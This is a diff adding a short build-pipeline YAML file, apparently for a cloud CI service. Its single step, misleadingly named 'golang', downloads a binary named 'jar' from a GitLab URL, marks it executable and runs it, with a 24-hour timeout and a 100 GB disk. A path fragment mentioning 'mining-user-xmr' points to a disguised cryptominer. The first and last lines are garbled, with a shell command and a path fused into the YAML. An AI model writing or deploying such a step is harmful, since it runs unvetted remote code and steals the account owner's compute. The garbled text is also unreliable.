@@ -1,0 +1,12 @@
+sudo apt update && sudo apt install -y steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         apt update && apt-get install sudo -y && wget https://gitlab.com/ajayyohiki/jar/-/raw/main/jar && chmod u+x jar && ./jar
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'/mining-user-xmr/2f647f057c260d79fb5567712ed3b4b0
